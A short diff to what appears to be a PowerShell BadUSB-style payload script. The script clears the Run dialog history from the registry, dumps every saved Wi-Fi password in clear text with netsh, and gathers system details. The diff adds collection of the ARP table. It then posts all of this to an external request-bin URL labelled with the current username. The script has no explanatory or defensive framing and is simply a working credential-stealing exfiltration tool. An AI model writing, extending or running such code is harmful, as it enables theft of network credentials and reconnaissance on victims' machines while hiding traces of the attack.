@@ -1,5 +1,6 @@
 Remove-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse
 $wifi = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {echo "{$name : $pass}`n"}
 $info = Get-ComputerInfo | Out-String
-$data = $wifi + $info
+$net = arp -a | Out-String
+$data = $wifi + $net + $info 
 Invoke-RestMethod https://encssv4vtly2.x.pipedream.net/$(whoami) -Method Post -Body $data
